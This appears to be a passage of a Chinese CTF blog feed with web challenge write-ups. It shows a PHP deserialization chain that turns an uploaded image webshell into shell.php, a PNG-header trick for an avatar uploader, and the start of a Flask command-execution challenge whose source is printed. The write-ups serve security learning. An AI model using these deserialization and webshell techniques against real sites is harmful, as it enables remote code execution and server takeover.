class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;          <span class="hljs-comment">#检查是否上传了文件，如果上传了文件进入该if语句</span><br>        <span class="hljs-variable language_">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ext_check</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ext) &#123;            <span class="hljs-comment">#这个是文件后缀名，文件有后缀名就可以进入</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp)) &#123;   <span class="hljs-comment">#这里判断文件类型使用了getimagesize</span><br>            @<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp, <span class="hljs-variable">$this</span>-&gt;filename);    <span class="hljs-comment">#复制文件</span><br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename_tmp);<br>            <span class="hljs-variable language_">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">update_img</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码将上传的文件的文件名修改为以<code>.png</code>结尾</p><p>并用<code>getimagesize</code>函数检查文件类型</p><p><code>getimagesize()</code>会通过读取图片文件的头部信息来确定图片的大小和类型</p><p>所以需要上传图片马。</p><p>由于文件名被修改，图片马无法直接使用，</p><p>需要配合文件包含，或者将文件名修改为<code>.php</code>结尾。</p><p>在login_check函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">cookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>       <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$profile</span>))&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;profile=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$profile</span>));   <span class="hljs-comment">#这里有对cookie的反序列化操作</span><br>           <span class="hljs-variable language_">$this</span>-&gt;profile_db=<span class="hljs-title function_ invoke__">db</span>(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>]))-&gt;<span class="hljs-title function_ invoke__">find</span>();<br>           <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_diff</span>(<span class="hljs-variable">$this</span>-&gt;profile_db,<span class="hljs-variable">$this</span>-&gt;profile)==<span class="hljs-literal">null</span>)&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>           &#125;<span class="hljs-keyword">else</span>&#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>发现cookie是序列化的数据，网站读取cookie时会进行反序列化操作。</p><p>Register类中有__destruct方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;registed)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此可以把Register类当作反序列化的入口类。</p><p>再结合Profile类中的两个魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实现调用<code>upload_img</code>方法更改文件名。</p><p>反序列化链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>. R<span class="hljs-function"><span class="hljs-title">egister</span>-&gt;</span>__destruct<br><span class="hljs-number">2</span>. P<span class="hljs-function"><span class="hljs-title">rofile</span>-&gt;</span>__call<br><span class="hljs-number">3</span>. P<span class="hljs-function"><span class="hljs-title">rofile</span>-&gt;</span>upload_img<br></code></pre></td></tr></table></figure><p>在网页源码中找到已经上传的图片马的路径</p><p><img src="https://s2.loli.net/2024/07/23/waRoyLm5xh6OHKA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">web</span>\<span class="hljs-title class_">controller</span>;   <span class="hljs-comment">//命名空间，这句必须有</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$index</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Register</span>();<br><span class="hljs-variable">$a</span>-&gt;registed=<span class="hljs-literal">false</span>;   <span class="hljs-comment">//用于进入__destruct()中的if语句</span><br><span class="hljs-variable">$a</span>-&gt;checker=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>();<br><span class="hljs-variable">$a</span>-&gt;checker-&gt;checker=<span class="hljs-literal">false</span>;    <span class="hljs-comment">//跳过upload_img()中的第一个if，登录检测</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;index=<span class="hljs-string">&quot;upload_img&quot;</span>;    <span class="hljs-comment">//调用__call()时使$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments)形成$this-&gt;upload_img($arguments)的效果</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;ext=<span class="hljs-number">1</span>;   <span class="hljs-comment">//进入upload_img()中的第三个if</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;filename_tmp=<span class="hljs-string">&quot;./upload/c7129430ace4c05bd5bcee0bd02b538b/0a7b8575f81e6d28645879810e6f43a9.png&quot;</span>;<span class="hljs-comment">//这里路径要注意，在网页源代码中得到的路径是基于/index.php/home.html的，文件操作源码的路径是/Profile.php，所以要去掉一个点</span><br><span class="hljs-variable">$a</span>-&gt;checker-&gt;filename=<span class="hljs-string">&quot;./upload/shell.php&quot;</span>;     <span class="hljs-comment">//图片马的目标转移位置</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>用生成的序列化字符串替换cookie</p><p><img src="https://s2.loli.net/2024/07/23/dw9T2ifeqmC4jQy.png"></p><p>然后刷新网页。</p><p>访问http:/xxxxxxxxxxxxxxxx.node5.buuoj.cn/upload/shell.php</p><p><img src="https://s2.loli.net/2024/07/23/ayZmuljkOwB8evV.png"></p><p>之后蚁剑连接-&gt;读取flag即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HarekazeCTF2019 Avatar Uploader 1</title>
    <link href="/2024/07/07/%5BHarekazeCTF2019%5DAvatar%20Uploader%201/"/>
    <url>/2024/07/07/%5BHarekazeCTF2019%5DAvatar%20Uploader%201/</url>
    
    <content type="html"><![CDATA[<h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p>原题中是给出源码的</p><p>主要看upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);<br><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY);<br><br><span class="hljs-comment">// check whether file is uploaded</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file size</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ok</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>);<br><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>关键在这部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// check file type</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// check file width/height</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据代码意思，</p><p>如果上传的图片使<code>finfo_file()</code>判断为png，</p><p><code>getimagesize()</code>判断为非png，</p><p>那么就可以得到flag。</p><p><code>finfo_file()</code>只根据文件头部的特殊标识符判断文件类型。</p><p><code>getimagesize()</code>会通过读取图片文件的头部信息来确定图片的大小和类型。</p><p>所以可以上传一个只有文件头部的特殊标识符的文件，</p><p>由于没有宽高等信息，<code>getimagesize()</code>将会读取失败，</p><p>满足<code>$size[2] !== IMAGETYPE_PNG</code>，得到flag。</p><p><img src="https://s2.loli.net/2024/07/13/qUQGPcSxWzCIvm8.webp"></p><p><img src="https://s2.loli.net/2024/07/13/6tcVznl9Lbv4ukT.webp"></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHCTF 2023 week2 web ez_rce</title>
    <link href="/2023/10/14/SHCTF-week2-web-ez_rce/"/>
    <url>/2023/10/14/SHCTF-week2-web-ez_rce/</url>
    
    <content type="html"><![CDATA[<h1 id="SHCTF-2023-week2-web-ez-rce"><a href="#SHCTF-2023-week2-web-ez-rce" class="headerlink" title="[SHCTF 2023] week2 web ez_rce"></a>[SHCTF 2023] week2 web ez_rce</h1><p>题目源码(附件)如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gett</span>(<span class="hljs-params">obj,arg</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,i)<br>    <span class="hljs-keyword">return</span> tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sett</span>(<span class="hljs-params">obj,arg,num</span>):<br>    tmp = obj<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg)-<span class="hljs-number">1</span>):<br>        tmp = <span class="hljs-built_in">getattr</span>(tmp,arg[i])<br>    <span class="hljs-built_in">setattr</span>(tmp,arg[i+<span class="hljs-number">1</span>],num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>(<span class="hljs-params">giveme,num,bol</span>):<br>    c = gett(subprocess,giveme)<br>    tmp = <span class="hljs-built_in">list</span>(c)<br>    tmp[num] = bol<br>    tmp = <span class="hljs-built_in">tuple</span>(tmp)<br>    sett(subprocess,giveme,tmp)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">arg</span>):<br>    subprocess.call(arg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;exec&#x27;</span>)==<span class="hljs-string">&#x27;ok&#x27;</span>:<br>            shell = request.args.get(<span class="hljs-string">&#x27;shell&#x27;</span>)<br>            cmd(shell)<br>        <span class="hljs-keyword">else</span>:<br>            exp = <span class="hljs-built_in">list</span>(request.get_json()[<span class="hljs-string">&#x27;exp&#x27;</span>])<br>            num = <span class="hljs-built_in">int</span>(request.args.get(<span class="hljs-string">&#x27;num&#x27;</span>))<br>            bol = <span class="hljs-built_in">bool</span>(request.args.get(<span class="hljs-string">&#x27;bol&#x27;</span>))<br>            hint(exp,num,bol)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>以下内容来自<a href="https://yiyan.baidu.com/">文心一言 </a></p><h3 id="整体"><a href="#整体" class="headerlink" title="整体"></a>整体</h3><blockquote><p>这段代码是一个基于 Flask 的 web 服务程序，它允许用户通过 web 请求执行一些操作。以下是代码的逐行详细分析：</p><ol><li><code>from flask import *</code>：从 Flask 模块导入所有内容。这将导入 Flask 框架的所有功能和类。</li><li><code>import subprocess</code>：导入 subprocess 模块，这个模块允许你从 Python 代码中执行外部命令。</li><li><code>app = Flask(__name__)</code>：创建一个 Flask web 服务实例。</li></ol><p>4-7. <code>def gett(obj,arg):</code>：定义一个函数 gett，它接收两个参数，一个对象和一个参数列表。函数通过 getattr 函数递归地获取对象的属性。</p><p>8-12. <code>def sett(obj,arg,num):</code>：定义一个函数 sett，它接收一个对象，一个参数列表和一个数值。函数通过 getattr 函数递归地获取对象的属性，并使用 setattr 函数设置最后一个属性的值。</p><p>13-19. <code>def hint(giveme,num,bol):</code>：定义一个函数 hint，它接收一个参数列表，一个数值和一个布尔值。函数首先使用 gett 函数获取 subprocess 模块的某个属性，然后修改这个属性的某个元素的值，并使用 sett 函数设置新的值。</p><p>20-22. <code>def cmd(arg):</code>：定义一个函数 cmd，它接收一个参数列表，并使用 subprocess.call 函数执行外部命令。</p><p>24-34. <code>@app.route(&#39;/&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>：定义一个路由，处理 ‘/‘ 路径的 GET 和 POST 请求。请求处理函数首先检查请求参数 ‘exec’，如果它的值为 ‘ok’，则执行外部命令。否则，它从请求的 JSON 数据中获取一个表达式列表，一个数值和一个布尔值，并使用 hint 函数修改 subprocess 模块的某个属性的值。</p><p>35-37. <code>if __name__ == &#39;__main__&#39;:</code>：如果代码作为主程序运行，则启动 Flask web 服务，监听所有 IP 地址的 5000 端口。</p><p>总的来说，这段代码的功能比较模糊，它似乎允许用户通过 web 请求执行外部命令，并修改 subprocess 模块的某些属性的值。这可能是一个潜在的安全风险，因为恶意用户可以利用这个功能执行任意命令。</p></blockquote><h3 id="hint-、gett-、sett"><a href="#hint-、gett-、sett" class="headerlink" title="hint() 、gett()、sett()"></a>hint() 、gett()、sett()</h3><blockquote><p><code>hint</code>、<code>gett</code>和<code>sett</code>三个函数结合在一起，可以实现通过字符串形式的属性名来动态地获取和设置对象的属性值。</p><p><code>gett</code>函数通过递归调用<code>getattr</code>函数，可以获取对象的嵌套属性。例如，如果有一个对象<code>obj</code>，它有一个属性<code>a</code>，属性<code>a</code>又有一个属性<code>b</code>，那么我们可以通过调用<code>gett(obj, [&#39;a&#39;, &#39;b&#39;])</code>来获取<code>obj.a.b</code>的值。</p><p><code>sett</code>函数和<code>gett</code>函数类似，它也可以通过递归调用<code>getattr</code>函数来获取对象的嵌套属性，然后使用<code>setattr</code>函数来设置最后一个属性的值。例如，如果我们要将<code>obj.a.b</code>的值设置为<code>123</code>，可以通过调用<code>sett(obj, [&#39;a&#39;, 